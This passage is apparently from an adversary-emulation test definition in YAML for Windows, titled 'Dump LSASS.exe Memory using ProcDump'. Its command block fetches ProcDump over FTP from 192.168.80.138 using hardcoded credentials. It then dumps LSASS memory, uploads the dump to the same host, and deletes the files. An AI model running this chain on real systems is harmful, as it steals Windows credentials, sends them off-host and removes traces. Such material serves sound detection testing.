    attacks. This can be achieved with Sysinternals

    ProcDump.


    Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.


    If you see a message saying "procdump.exe is not recognized as an internal or
    external command", try using the  get-prereq_commands to download and install
    the ProcDump tool first.

    '
  executor:
    cleanup_command: 'del "#{output_file}" >nul 2> nul

      '
    command: 'echo user user1 anis > #{working_directory}\command.txt

      echo get Procdump/procdump64.exe #{working_directory}\procdump64.exe >> #{working_directory}\command.txt

      echo bye >> #{working_directory}\command.txt

      ftp -n -s:#{working_directory}\command.txt 192.168.80.138

      #{working_directory}\procdump64.exe -accepteula -ma lsass.exe #{working_directory}\lsass_dump.dmp

      echo user user1 anis > #{working_directory}\command1.txt

      echo put #{working_directory}\lsass_dump.dmp lsass.dmp >> #{working_directory}\command1.txt

      echo bye >> #{working_directory}\command1.txt

      ftp -n -s:#{working_directory}\command1.txt 192.168.80.138

      del #{working_directory}\command.txt

      del #{working_directory}\command1.txt

      del #{working_directory}\procdump64.exe

      del #{working_directory}\lsass_dump.dmp

      '
    elevation_required: true
    name: command_prompt
  input_arguments:
    working_directory:
      default: C:\Users\user1\Desktop
      description: the directory that receives inputs and outputs
      type: path
  name: Dump LSASS.exe Memory using ProcDump
  supported_platforms:
  - windows
